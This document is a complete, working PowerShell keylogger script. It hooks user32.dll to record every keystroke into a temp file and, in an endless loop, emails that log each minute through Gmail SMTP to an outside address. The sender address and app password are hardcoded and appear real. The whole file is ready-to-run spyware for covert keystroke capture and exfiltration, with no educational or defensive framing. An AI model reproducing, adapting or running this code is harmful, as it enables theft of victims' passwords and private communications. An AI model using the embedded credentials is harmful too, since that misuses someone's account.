# Email Configuration
$From = "billbudofficial@gmail.com"
$Pass = "rwchezscuvfyojgf"
$To = "amulyajain123@gmail.com"
$Subject = "Keylogger Results"
$SMTPServer = "smtp.gmail.com"
$SMTPPort = "587"
$credentials = New-Object Management.Automation.PSCredential $From, ($Pass | ConvertTo-SecureString -AsPlainText -Force)

# Define log file location (Persistent)
$Path = "$env:temp\keylogger.txt"

# Ensure the file exists and create if not
if (!(Test-Path $Path)) {
    New-Item -Path $Path -ItemType File -Force | Out-Null
}

# Import necessary API functions for capturing keystrokes
$signature = @"
using System;
using System.Runtime.InteropServices;

public class KeyLogger {
    [DllImport("user32.dll")]
    public static extern short GetAsyncKeyState(int vKey);
}
"@

# Add API and ensure it's properly loaded
if (-not ("KeyLogger" -as [type])) {
    Add-Type -TypeDefinition $signature -Language CSharp -PassThru | Out-Null
}

# Function to map special keys correctly
function Map-SpecialKey($keyCode) {
    switch ($keyCode) {
        8 { return "[Backspace]" }
        9 { return "[Tab]" }
        13 { return "[Enter]`r`n" }  # Newline
        16 { return "[Shift]" }
        17 { return "[Ctrl]" }
        18 { return "[Alt]" }
        20 { return "[CapsLock]" }
        27 { return "[Esc]" }
        32 { return " " }  # Space
        37 { return "[LeftArrow]" }
        38 { return "[UpArrow]" }
        39 { return "[RightArrow]" }
        40 { return "[DownArrow]" }
        46 { return "[Delete]" }
        default { return [char]$keyCode }
    }
}

# Function to start keylogger
function Start-KeyLogger {
    while ($true) {  # Infinite loop
        $TimeStart = Get-Date
        $TimeEnd = $TimeStart.AddMinutes(1)

        while ((Get-Date) -lt $TimeEnd) {
            Start-Sleep -Milliseconds 50  # Reduce CPU usage
            for ($ascii = 8; $ascii -le 255; $ascii++) {
                if ([KeyLogger]::GetAsyncKeyState($ascii) -eq -32767) {
                    $loggedKey = Map-SpecialKey $ascii
                    [System.IO.File]::AppendAllText($Path, $loggedKey, [System.Text.Encoding]::UTF8)
                }
            }
        }

        # Send email with the log file (DO NOT DELETE THE FILE)
        Send-MailMessage -From $From -To $To -Subject $Subject -Body "Keylogger Logs" -Attachments $Path -SmtpServer $SMTPServer -Port $SMTPPort -Credential $credentials -UseSsl
        
        # Wait 5 seconds before restarting (prevents overloading)
        Start-Sleep -Seconds 5
    }
}

# Start infinite keylogger loop
Start-KeyLogger
